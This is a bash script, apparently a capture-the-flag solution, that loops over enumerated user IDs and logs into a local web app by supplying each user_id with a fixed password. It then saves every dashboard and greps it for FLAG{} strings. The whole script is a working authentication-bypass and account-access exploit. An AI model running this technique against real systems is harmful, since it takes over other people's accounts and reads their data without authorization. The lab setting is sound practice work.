echo "========================================="
echo "ACCESSING DASHBOARDS FOR VALID USER_IDS"
echo "========================================="
echo ""

# For each valid user_id, authenticate and access dashboard
for id in $(cat /tmp/valid_users.txt); do
    echo "========================================="
    echo "Testing user_id=${id}"
    echo "========================================="
    
    # Authenticate with valid user_id
    curl -s -c /tmp/cookie_${id}.txt \
        -d "username=test&user_id=${id}&password=test" \
        http://127.0.0.1:32821/password/test > /dev/null
    
    # Access dashboard and save full response
    echo ""
    echo "Dashboard content for user_id=${id}:"
    dashboard_content=$(curl -s -b /tmp/cookie_${id}.txt http://127.0.0.1:32821/dashboard)
    echo "$dashboard_content" | tee /tmp/dashboard_${id}.txt
    
    # Search for FLAG{} pattern
    echo ""
    echo "Searching for FLAG{} patterns..."
    flag=$(echo "$dashboard_content" | grep -oP 'FLAG\{[^}]*\}')
    if [ ! -z "$flag" ]; then
        echo "[***] FLAG FOUND: $flag"
        echo "$flag" >> /tmp/flags_found.txt
    else
        echo "No FLAG{} pattern found in dashboard for user_id=${id}"
    fi
    
    echo ""
    echo "---"
    echo ""
done

echo ""
echo "========================================="
echo "FINAL RESULTS"
echo "========================================="
echo ""
echo "Valid user_ids:"
cat /tmp/valid_users.txt
echo ""
echo "Flags found:"
cat /tmp/flags_found.txt 2>/dev/null || echo "No flags found"
echo ""

